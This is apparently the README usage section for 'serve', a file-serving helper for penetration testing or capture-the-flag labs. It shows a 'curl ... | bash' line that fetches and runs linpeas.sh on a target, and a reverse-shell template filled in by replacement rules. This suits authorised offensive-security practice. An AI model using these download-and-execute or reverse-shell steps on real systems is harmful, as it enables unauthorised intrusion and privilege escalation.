## Usage

```
Usage: serve [OPTIONS] [ASSET] [PORT]

Arguments:
  [ASSET]  File or folder to serve
  [PORT]   Specify alternate port

Options:
  -b, --bind <BIND>                Specify alternate bind address
  -s, --status-code <STATUS_CODE>  Specify status code
      --ssl                        Use ssl
  -v, --verbose                    Verbose output
  -H, --header <HEADER>            Set headers
  -r <REPLACE_MAP>                 Match and replace functions
  -R, --redirect <REDIRECT>        Set permanent redirect to specified location
  -h, --help                       Print help information
  -V, --version                    Print version information
```

### 1. Serve static content

- If no arguments are specified, it serves files from the current directory.

- If a file is specified as first argument, the option for copying the download command is provided based on the file
  extension:

```bash
$ serve /path/to/linpeas.sh 
Serving /path/to/linpeas.sh at http://10.10.14.6:9000
Copied 'curl -k -s http://10.10.14.6:9000 | bash' to clipboard
```

- The above command can be shortened as:

```bash
$ serve lps
```

given the following entry in [config.yaml](config.yaml):

```yaml
alias:
  lps: "/path/to/linpeas.sh"
```

### 2. Define match replace rules

```bash
$ serve rev -r REPLACE_IP:$ip -r REPLACE_PORT:9000
```

> Reverse shell, template: [rev_shell.sh](examples/rev_shell.sh)

### 3. Use `-v` for more information

```bash
$ serve -v
Serving . at https://10.10.14.6:9000
10.10.14.6 - - [05/Jan/2023 17:21:18] "GET /" 404

<!---------- Request Start ----------

GET /
Host: 10.10.14.6:9000
User-Agent: HTTPie/1.0.3
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive

----------  Request End  ----------!>
```